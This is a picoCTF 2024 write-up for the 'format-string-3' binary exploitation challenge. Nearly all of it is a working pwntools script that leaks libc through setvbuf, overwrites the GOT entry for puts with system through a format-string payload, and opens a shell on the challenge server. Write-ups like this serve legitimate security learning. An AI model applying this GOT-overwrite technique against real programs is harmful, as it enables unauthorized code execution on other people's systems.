# Description

_#Medium_<br>
_#Binary_Exploitation_<br>
_#picoCTF_2024_<br>
_#format_string_<br>
_#browser_webshell_solvable_<br>

This program ***doesn't contain a win function***. How can you win?<br>
Download the binary [here](format-string-3).<br>
Download the source [here](format-string-3.c).<br>
Download libc [here](libc.so.6), download the interpreter [here](ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.

## Solution


``` python
#!/usr/bin/env python3
from pwn import *

# Context setup
exe = "./format-string-3"
libc_path = "./libc.so.6"

context.binary = ELF(exe)
libc = ELF(libc_path)
context.terminal = ["tmux", "splitw", "-h"]

# Offset for the format string vulnerability
FMT_STR_OFFSET = 38


def leak_libc_base(io):
    """Leaks the libc base address from the provided setvbuf leak."""
    io.recvuntil(b'setvbuf in libc: ')
    setvbuf_leak = int(io.recvline().strip(), 16)
    log.info(f"Leaked setvbuf address: {hex(setvbuf_leak)}")

    libc_base = setvbuf_leak - libc.symbols["setvbuf"]
    log.info(f"Calculated libc base address: {hex(libc_base)}")

    libc.address = libc_base  # Set the base address for further calculations
    return libc_base


def create_payload():
    """Creates the format string payload to overwrite GOT entry for `puts`."""
    target_address = context.binary.got["puts"]
    system_address = libc.symbols["system"]
    log.info(f"Target address (GOT entry for puts): {hex(target_address)}")
    log.info(f"New function address (system): {hex(system_address)}")

    payload = fmtstr_payload(FMT_STR_OFFSET, {target_address: system_address})
    log.info(f"Generated payload: {payload}")
    return payload


def main():
    # Connect to the target binary (remote or local)
    io = remote("rhea.picoctf.net", 64550)

    # Attach GDB for debugging if required
    if args.GDB:
        gdb.attach(io, gdbscript="b *main+127\ncontinue")

    # Leak libc base address
    libc_base = leak_libc_base(io)

    # Create the payload to exploit the format string vulnerability
    payload = create_payload()

    # Send the payload
    io.sendline(payload)

    # Get an interactive shell
    io.interactive()


if __name__ == "__main__":
    main()
```
**This script was written with reference to [online author].(https://blog.thecyberthesis.com/blog/writeups/picoCTF/pwn/format-string-3).*
